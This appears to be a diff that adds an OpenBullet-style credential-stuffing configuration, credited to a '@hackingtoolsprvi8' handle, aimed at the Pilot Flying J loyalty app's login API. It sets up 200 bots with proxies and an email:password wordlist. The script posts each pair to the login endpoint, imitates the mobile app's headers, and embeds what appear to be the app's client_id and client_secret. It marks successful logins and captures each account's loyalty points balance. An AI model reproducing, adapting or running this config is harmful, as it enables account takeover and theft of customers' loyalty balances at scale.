@@ -1,0 +1,76 @@
+[SETTINGS]
+{
+  "Name": "Pilot Flying J(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-19T10:22:42.5023156+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.cp.pilotflyingj.com/pfj-mypilot/api/v1/auth/login" 
+  CONTENT "{\"Password\":\"<PASS>\",\"Domain\":\"Loyalty\",\"Username\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: api.cp.pilotflyingj.com" 
+  HEADER "ADRUM_1: isMobile:true" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-IR;q=1, fa-IR;q=0.9" 
+  HEADER "Content-Type: application/json" 
+  HEADER "User-Agent: com.pilottravelcentersllc.PFJLLMobileApp/6.7" 
+  HEADER "Connection: keep-alive" 
+  HEADER "client_secret: 8D58F9Aa3e09417F8cA37757884333a8" 
+  HEADER "ADRUM: isAjax:true" 
+  HEADER "client_id: aa61bfd0aabe4cc5adec32f2ae2240e2" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Unauthorized" 
+  KEYCHAIN Success OR 
+    KEY "loginResult\": {\"Success" 
+
+PARSE "<SOURCE>" JSON "household.Balances[0].Value" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "Points" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
